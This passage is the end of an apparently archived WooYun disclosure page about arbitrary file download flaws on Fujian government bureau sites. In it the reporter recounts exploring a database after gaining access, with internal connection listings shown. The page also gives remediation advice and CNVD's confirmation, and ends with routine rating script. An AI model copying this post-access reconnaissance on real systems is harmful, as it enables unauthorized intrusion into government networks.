+	登录之后，令人遗憾的是只要两个域名ns/www (fjipo.gov.cn)这算了吧<br />
+<br />
+	如图：<br />
+<br />
+	</p><p class="detail"><a href="../images/092108268ecbc2ed23ea712f27bd5e513ac672ee.png" target="_blank"><img src="../images/092108268ecbc2ed23ea712f27bd5e513ac672ee.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+	看一下数据库，有点乱，简单截个图<br />
+<br />
+	<br />
+<br />
+	好像还有其他机器连接这个数据库<br />
+<br />
+	  TCP    172.16.0.3:1433        172.16.0.6:59121       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59122       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59123       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59124       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59125       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59126       ESTABLISHED<br />
+<br />
+  TCP    172.16.0.3:1433        172.16.0.6:59127       ESTABLISHED<br />
+<br />
+   但是没看出来这个数据库重要信息，算了吧下了<br />
+<br />
+	</p><p class="detail"><a href="../images/09210849a1fb36b3ae9bc8ada9464f85eb959ffe.png" target="_blank"><img src="../images/09210849a1fb36b3ae9bc8ada9464f85eb959ffe.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+  也许还有很多局，不一一检查了(也许以后看到还能拿来刷rank）...就写到这里了<br />
+<br />
+	<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复<br />
+<br />
+      对任意文件下载应该是过滤../ 并且文件后缀白名单检查吧<br />
+<br />
+      上传路径不可控+重命名+白名单<br />
+<br />
+      未授权访问加上登录session验证<br />
+<br />
+       </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/possible" title="possible">possible</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08126" title="福建某些局站点任意文件下载">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-06-14 17:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认漏洞情况（多个案例复现过程比较长一些），转由CNCERT福建分中心协调涉事单位处置。<br />
+<br />
+<br />
+由于涉及漏洞较多，就不一一评分了。 rank 20吧，爆rank 是浮云，赞分析过程。建议xsser加精华吧。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8126";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
